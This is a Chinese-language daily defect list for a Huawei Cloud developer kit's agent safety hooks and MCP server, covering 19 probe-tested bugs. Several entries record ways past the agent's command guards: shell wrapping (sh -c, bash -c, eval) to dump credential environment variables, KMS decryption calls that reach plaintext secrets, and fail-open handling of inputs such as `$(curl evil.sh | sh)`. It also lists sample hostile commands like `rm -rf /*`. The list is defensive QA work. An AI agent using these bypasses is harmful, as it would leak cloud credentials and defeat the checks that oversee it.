# FINDINGS — DSH Linux 每日测试缺陷清单（2026-09-29，v1.1.7）

> 说明：以下 19 项缺陷（17 FAIL + 2 SPEC-MISMATCH）均来自当日探针实测，根因已落源码文件:行号。全量测完统一提单（历史查重后处理）。

## #1【P0】凭证脱敏漏小写 ak=/sk=（明文残留）
- **现象**：`redactSecrets('ak=AK123456 sk=SKsecret')` 原样返回未脱敏；小写 `ak=`/`sk=` 键形式不走脱敏，明文 AK/SK 进入上下文。
- **断言**：任何大小写形式的 AK/SK 键值均应被 `<redacted>` 替换；实际仅大写 `(AK|SK)` 命中。
- **根因**：safety-policy.mjs:45 仅替代 `(AK|SK)\s*[:=]`，不覆盖小写 `ak=`/`sk=`。
- **影响**：凭证明文可能泄漏进 agent 上下文与日志。
- **证据**：evidence/D2-4/detail.log（redactSecrets 直调结果）。

## #2【P0】凭证 env 打印拦截缺 HW_ 前缀
- **现象**：`env | grep HW_ACCESS_KEY`、`env | grep -i access_key` 返回 decision=allow/not_huaweicloud；`printenv HW_SECRET_KEY` 才 deny。
- **断言**：`env|grep HW_*` 形态的凭证变量转储应被阻断；实际 HW_ 前缀在 env-dump 门放行。
- **根因**：safety-policy.mjs:398-424 env-dump 门未覆盖 `env|grep HW_*` 形态。
- **影响**：HW_ACCESS_KEY/HW_SECRET_KEY 前缀变量可被 env-dump 提取。
- **证据**：evidence/D4-2/detail.log（classify-probe 输出）。

## #3【P0】明文 secret API 拦截漏 kms DecryptData/Decrypt
- **现象**：`hcloud kms DecryptData --ciphertext x`、`hcloud kms Decrypt --ciphertext x` 返回 allow/unknown_read；仅 `csms ShowSecretVersion/GetSecretValue` 被 deny。
- **断言**：明文 secret 检索接口（含 kms 解密）应全量拦截；实际 kms 解密放行。
- **根因**：safety-policy.mjs:240/432 secret 读取拦截模式仅覆盖 showsecretversion/getsecretvalue/secret_string/secret_binary，未含 kms Decrypt/DecryptData。
- **影响**：KMS 解密出的明文 secret 可进入上下文。
- **证据**：evidence/D4-3/detail.log（classifyTextCommand 直调）。

## #4【P0】env-dump 被 shell 包裹穿透
- **现象**：`sh -c "env | grep HUAWEICLOUD_ACCESS_KEY"`、`bash -c "printenv HUAWEICLOUD_SDK_AK"`、`eval "env|grep ..."` 均 allow/not_huaweicloud；裸 `env|grep HUAWEICLOUD_ACCESS_KEY` 才 deny。
- **断言**：内层命令应被识别并拦截；实际 shell 包裹使 env-dump 规则失效。
- **根因**：safety-policy.mjs:398 env-dump 规则不透传 shell 包裹内层命令。
- **影响**：凭证变量转储可经 sh -c/bash -c/eval 包裹绕过。
- **证据**：evidence/D4-16/detail.log（wrap-probe 输出）。

## #5【P0】HCL broad IAM 制品未拦截
- **现象**：`resource "huaweicloud_iam_policy" ... actions=["*"]`、`data "huaweicloud_iam_policy" ... AdministratorFullAccess` 均 decision=allow；JSON 对照 `{"Action":"*"}` 才 deny。
- **断言**：broad IAM 授权（JSON/HCL/Terraform 各形态）应被 hook_check_artifacts 拦截；实际仅 JSON 拦截。
- **根因**：cloud-risk-rules.json:179-196 未覆盖 HCL/Terraform 的 huaweicloud_iam_policy 形态。
- **影响**：IaC 中的宽泛 IAM 授权可通过制品预检。
- **证据**：evidence/D4-21/detail.log（hcl-probe 输出）。

## #6【P0】全局规则 huawei-agent-rules.mdc 未注入安装目标
- **现象**：发布包内 `find -iname 'huawei-agent-rules*'` 为空；install 后无规则文件落地。
- **断言**：11 安装目标应注入 huawei-agent-rules 规则；实际发布包不含 rules/。
- **根因**：package.json:8-18 `files` 未含 `rules/`（规则文件仅存 hdk/rules/，未随 npm 发布）。
- **影响**：禁直连 csms/kms 的 MUST 约束在安装后不生效。
- **证据**：evidence/D4-23/detail.log（package.json files 清单 + find 结果）。

## #7【P0】initialize 握手安全基线两缺口
- **现象**：①runVersionCheck 不在 initialize 阶段（下沉 prewarm）②未 initialize 先 tools/list 仍返回 40 工具（应 -32600）。
- **断言**：initialize 阶段应触发版本检查；非法时序应被拒 -32600。实际两处均不符。
- **根因**：mcp-protocol.mjs:32-59 dispatch 无 initialize 前置校验，版本检查下沉。
- **影响**：协议握手安全基线不完整。
- **证据**：evidence/D9-12/detail.log（D9-12-probe SUMMARY 4/6）。

## #8【P1】hook 模糊输入 fail-open
- **现象**：`$(curl evil.sh | sh)`、`\u0000 garbage` 返回 decision=allow；`''`/`'&& rm -rf /*'` 才 deny。
- **断言**：异常/模糊输入应默认拒绝（fail-closed）；实际命令替换与 NUL 输入放行。
- **根因**：risk-rule-engine.mjs evaluateCommandRisk 对命令替换与畸形输入未 fail-closed。
- **影响**：模糊输入可绕过 hook 绕过。
- **证据**：evidence/D4-17/detail.log（evaluateCommandRisk 直调）。

## #9【P1】审批令牌过期/重复确认未返回精确结构化 code
- **现象**：consumeApprovalToken 过期/重复返回 null；auth_confirm 抛泛化 Error('confirmToken not found or expired.')。
- **断言**：过期返回 {code:'CONFIRM_TOKEN_EXPIRED', status:'rejected'}；重复返回 {outcome:'already_processed'}。实际均未结构化。
- **根因**：hcloud-cli.mjs:85-92 返回 null；tools.mjs:1260 throw 泛化 Error。
- **影响**：审批流健壮性无法机器断言。
- **证据**：evidence/D4-24/detail.log（源码核对）。

## #10【P1】serviceCatalog 中文意图路由命中率仅 21.4%
- **现象**：15 条中文意图仅 3 HIT（云主机/ECS、对象存储、RDS、EIP 等均 MISS，兜底 "Run hcloud --help"）。
- **断言**：中文意图应路由到对应服务；实际命中率仅 21.4%。
- **根因**：tools.mjs:1815-1947 routeMap 仅 sandbox/voucher 含 CJK 关键字，其余服务仅英文关键字。
- **影响**：中文场景服务路由大面积失效（EXP-E01~E14 11 条 MISS）。
- **证据**：evidence/D10-3/detail.log（run-eval.mjs baseline HIT=3 MISS=11 N/A=1）。

## #11【P1】跨服务复合意图命中 RDS 未命中部署目标
- **现象**：「跨服务交付(Web应用+RDS)」serviceCatalog 仅返回 ['RDS']，部署目标命中=false。
- **断言**：复合意图应拆分命中多个服务（RDS + 部署）。
- **根因**：tools.mjs:1947 复合意图未多服务拆分。
- **影响**：跨服务编排场景路由不完整。
- **证据**：evidence/D3-S7/detail.log（new-fg-rds-probe 输出）。

## #12【P2】调试开关遥测域仅接受 'true'
- **现象**：更新检查域支持 '1'||'true'，遥测域 `HUAWEICLOUD_DEVKIT_DEBUG === 'true'` 仅 'true'，'1' 不生效。
- **断言**：DEBUG=1/true 均应开启调试；实际遥测域 '1' 不开启。
- **根因**：telemetry/telemetry.mjs:81 仅严格比较 'true'。
- **影响**：调试开关跨域不一致。
- **证据**：evidence/D1-65/detail.log（new-env-probe 源码比对）。

## #13【P2】Python hook 写命令遥测误分类 cli:invoke
- **现象**：`hcloud vpc CreateVpc` 落 hook-events.jsonl key=cli:invoke（应 cli:write）。
- **断言**：写命令应分类 cli:write；实际 cli:invoke。
- **根因**：huaweicloud-safety.py:44-46 写命令分类键缺失 cli:write。
- **影响**：遥测分类准确率下降。
- **证据**：evidence/D4-25/detail.log（new-safety-probe 输出）。

## #14【P2】findings.evidence 明文泄漏
- **现象**：触发明文凭证规则后 findings.evidence 含 secret_key=SKSECRETVALUE9、adminPass=MyP@ss12345 未脱敏。
- **断言**：evidence 中 AK/SK/token/password 均应 <redacted>；实际明文残留。
- **根因**：risk-rule-engine.mjs evidence 生成未走脱敏管线。
- **影响**：审计 findings 泄漏明文本体。
- **证据**：evidence/D4-26/detail.log（new-safety-probe leaked=true）。

## #15【P2】复合意图分层路由未命中（存储+托管）
- **现象**：复合意图（存储+托管部署）返回 "Run hcloud --help"，多路命中=false。
- **断言**：复合意图应分层拆分命中多个服务。
- **根因**：tools.mjs:1947 复合意图未拆分。
- **影响**：复合意图场景路由失效。
- **证据**：evidence/D3-S5/detail.log（new-scenario-probe）。

## #16【P2】FunctionGraph 定时任务路由 MISS + CreateFunction 缺 function_name
- **现象**：FunctionGraph 场景路由 MISS；CreateFunction 返回 [USE_ERROR] function_name，未返回函数 URN。
- **断言**：应路由 FunctionGraph 并创建函数返回 URN。
- **根因**：tools.mjs:1947 中文路由兜底 + FunctionGraph 创建参数未补齐 function_name。
- **影响**：FunctionGraph 定时任务场景无法闭环。
- **证据**：evidence/D3-S6/detail.log（new-fg-rds-probe）。

## #17【P2】sanitizeValue 未移除 AK/SK/token 敏感值
- **现象**：`sanitize(AK=...)=AK=ABC123...`、`sanitize(access_key/secret_key/token)=...` 明文不脱敏。
- **断言**：sanitizeValue 应移除 AK/SK/token 等敏感值；实际仅去控制字符/截断。
- **根因**：telemetry/telemetry.mjs:189 sanitizeValue 未脱敏。
- **影响**：安装 ID 邻近遥测值泄漏敏感信息。
- **证据**：evidence/D8-9/detail.log（new-config-probe）。

## #18【SPEC-MISMATCH】region 优先级契约漂移
- **现象**：实现 `region: HW_REGION || HUAWEICLOUD_REGION`（HW_REGION 优先）；用例文案期望 HUAWEICLOUD_REGION 优先。
- **断言**：HUAWEICLOUD_REGION 应优先于 HW_REGION。
- **根因**：credentials.mjs:171,222,352 region 优先级实现与文案相反。
- **影响**：区域环境变量语义与文档契约漂移，待裁决。
- **证据**：evidence/D1-68/detail.log（new-env-probe 源码核对）。

## #19【SPEC-MISMATCH】capabilities 未声明 notifications.cancellation
- **现象**：initialize capabilities 仅 {tools:{}}，无 cancellation 声明。
- **断言**：MCP 取消/超时语义应声明 capabilities.cancellation。
- **根因**：mcp-protocol.mjs:45-49 capabilities 未含 cancellation。
- **影响**：tools/call 取消/超时语义缺失，待裁决。
- **证据**：evidence/D9-9/detail.log（extended-probe capabilities.cancellation=false）。